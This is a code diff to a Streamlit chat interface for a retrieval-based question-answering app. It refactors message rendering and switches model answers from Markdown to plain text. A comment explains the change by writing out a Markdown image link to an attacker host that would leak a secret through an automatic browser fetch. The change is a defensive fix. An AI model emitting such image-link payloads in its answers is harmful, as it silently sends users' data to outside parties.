@@ -20,24 +20,36 @@ st.caption(PAGE_CAPTION)
 if "messages" not in st.session_state:
     st.session_state.messages = []
 
+def show(message: dict) -> None:
+    """Draw one chat message."""
+    with st.chat_message(message["role"]):
+        if message.get("error"):
+            st.error(message["content"])
+        else:
+            # Plain text on purpose: Markdown would let a model answer like
+            # ![](https://attacker.example/?code=SECRET) make the browser load
+            # that URL automatically, leaking data without a click.
+            st.text(message["content"])
+
+
+def add(message: dict) -> None:
+    """Save a message to the history and draw it."""
+    st.session_state.messages.append(message)
+    show(message)
+
+
 # Redraw the conversation so far.
 for message in st.session_state.messages:
-    with st.chat_message(message["role"]):
-        st.markdown(message["content"])
+    show(message)
 
 # chat_input returns the new question once, on the rerun right after it's sent.
 if question := st.chat_input("Ask about Northwind Gadgets"):
-    st.session_state.messages.append({"role": "user", "content": question})
-    with st.chat_message("user"):
-        st.markdown(question)
-
-    with st.chat_message("assistant"):
-        try:
-            with st.spinner("Thinking..."):
-                # Each question is answered on its own: the model doesn't see the history.
-                text, _retrieved_files = answer(question)  # files are shown in #6
-        except EXPECTED_ERRORS as error:
-            st.error(f"Error: {error}")
-        else:
-            st.markdown(text)
-            st.session_state.messages.append({"role": "assistant", "content": text})
+    add({"role": "user", "content": question})
+    try:
+        with st.spinner("Thinking..."):
+            # Each question is answered on its own: the model doesn't see the history.
+            text, _retrieved_files = answer(question)  # files are shown in #6
+    except EXPECTED_ERRORS as error:
+        add({"role": "assistant", "content": f"Error: {error}", "error": True})
+    else:
+        add({"role": "assistant", "content": text})
